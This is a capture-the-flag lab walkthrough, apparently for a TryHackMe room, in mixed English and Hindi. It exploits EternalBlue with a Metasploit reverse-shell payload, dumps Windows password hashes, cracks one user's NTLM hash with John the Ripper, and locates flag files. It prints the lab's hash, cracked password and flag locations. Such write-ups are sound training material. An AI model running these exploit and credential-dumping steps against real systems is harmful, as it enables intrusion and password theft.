# Task 4 — Cracking Windows Password Hash

### Objective

Exploit the vulnerable Windows machine, obtain a **Meterpreter session**, dump password hashes using `hashdump`, and crack the non-default user's NTLM hash.

---

## 1. Start Metasploit

```bash
msfconsole
```

Check existing sessions:

```bash
sessions -l
```

If there is no active session, select the EternalBlue exploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

---

## 2. Set the Payload
<img width="1009" height="739" alt="image (37)" src="https://github.com/user-attachments/assets/84d26c6f-74f1-4cb6-912f-8d87a2ebdb34" />

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Check the options:

```bash
show options
```

Important values:

```text
RHOSTS = Target machine IP
LHOST  = AttackBox IP
LPORT  = 4444
```

For this lab:

```bash
set RHOSTS 10.48.159.42
```

`LHOST` was:

```text
10.48.170.149
```

---

## 3. Exploit the Machine

```bash
exploit
```

If successful, you should get something similar to:

```text
Meterpreter session 1 opened
```

Check sessions:

```bash
sessions -l
```

---

## 4. Enter the Meterpreter Session

```bash
sessions -i 1
```

If it says:

```text
Session 1 is already interactive.
```

you are **already inside Session 1**, so don't run `sessions -i 1` again.

Your prompt should be:

```text
meterpreter >
```

---

## 5. Dump Password Hashes

<img width="1003" height="279" alt="WhatsApp Image 2026-08-12 at 19 40 58" src="https://github.com/user-attachments/assets/65d560a4-fd83-43e0-9c29-489671001b7e" />

Inside Meterpreter:

```bash
hashdump
```

Example output:

```text
Administrator:500:LM_HASH:NTLM_HASH:::
Guest:501:LM_HASH:NTLM_HASH:::
Jon:1002:LM_HASH:NTLM_HASH:::
```

The non-default user in this lab was:

```text
Jon
```

### Jon's NTLM Hash

```text
ffb43f0de35be4d9917ac0cc8ad57f8d
```

---

# 6. Prepare the Hash for Cracking

Background the Meterpreter session:

```bash
background
```

Open a **new Linux terminal**.

Create a file containing Jon's hash:

Tumhari hashdump line thi:

Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 
```bash
echo -n "ffb43f0de35be4d9917ac0cc8ad57f8d" > jon.txt
```

Check it:

```bash
cat jon.txt
```

---

# 7. Crack the Hash Using John the Ripper
<img width="1349" height="857" alt="WhatsApp Image 2026-08-14 at 18 59 18" src="https://github.com/user-attachments/assets/aa265711-801a-4ff5-9805-3ee66f553475" />

TryHackMe recommends the **RockYou** wordlist.

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon.txt
```

If the output says:

```text
0 password hashes cracked, 1 left
```

it means John didn't crack it in that run.

You can verify John's results with:

```bash
john --show jon.txt
```

For this lab, the cracked password is:

```text
alqfna22
```

```bash
echo -n "<NTLM-HASH>" > jon.txt

john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon.txt

john --show jon.txt
```

Flag 1 ka clue tha:

> **“This flag can be found at the system root.”**

Windows mein **system root = `C:\`**.

Tumhare Meterpreter session mein `shell` karne ke baad:

```cmd
cd C:\
dir
```

Flag file likely `flag1.txt` hogi. Direct search ke liye:

```cmd
dir C:\flag*
```

Agar `flag1.txt` dikhe, read karo:

```cmd
type C:\flag1.txt
```

# FLAG 2 — Passwords wali location

Abhi agar tum `meterpreter >` par ho:

```text
shell
```

Phir Windows CMD mein:

```cmd
cd C:\Windows\System32\config
dir
```

Yahan `SAM` file dikhegi — ye Windows ke local account password hashes ka database hai.

Ab Flag 2 ko directly search karo:

```cmd
dir C:\Windows\System32\config\flag*
```

Agar `flag2.txt` mile:

```cmd
type C:\Windows\System32\config\flag2.txt
```
